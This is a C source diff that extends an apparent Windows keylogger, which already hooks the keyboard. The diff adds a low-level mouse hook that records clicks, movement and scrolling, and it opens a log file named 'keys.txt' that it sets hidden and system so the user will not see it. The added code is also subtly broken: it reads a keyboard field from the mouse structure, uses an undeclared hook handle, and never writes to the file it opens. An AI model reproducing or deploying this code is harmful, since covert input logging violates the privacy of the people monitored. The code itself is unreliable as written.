@@ -32,13 +32,38 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
+LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        MSLLHOOKSTRUCT* ms = (MSLLHOOKSTRUCT*)lParam;
+		int virkey2 = ms->vkCode;
+		FILE* logfile = fopen("keys.txt", "a");
+		SetFileAttributesA("keys.txt", FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+        switch (wParam) {
+            case WM_LBUTTONDOWN:
+                printf("{Mouse: Left Button Down at (%ld, %ld)}\n", ms->pt.x, ms->pt.y);
+                break;
+            case WM_RBUTTONDOWN:
+                printf("{Mouse: Right Button Down at (%ld, %ld)}\n", ms->pt.x, ms->pt.y);
+                break;
+            case WM_MOUSEMOVE:
+                printf("{Mouse: Move at (%ld, %ld)}\n", ms->pt.x, ms->pt.y);
+                break;
+            case WM_MOUSEWHEEL:
+                printf("{Mouse: Wheel Scroll}\n");
+                break;
+        }
+        fclose(logfile);
+    }
+    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
+}
+
 int WinMain(HINSTANCE hIntance, HINSTANCE hPrevInstance, LPSTR cmdline, int show) {
     SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, GetModuleHandle(NULL), 0);
+    SetWindowsHookEx(WH_MOUSE_LL, MouseProc, NULL, 0);
 
     MSG msg = { 0 };
 
-    while (GetMessage(&msg, NULL, 0, 0)) {
-    }
+    while (GetMessage(&msg, NULL, 0, 0)) {}
 
     return 0;
 }
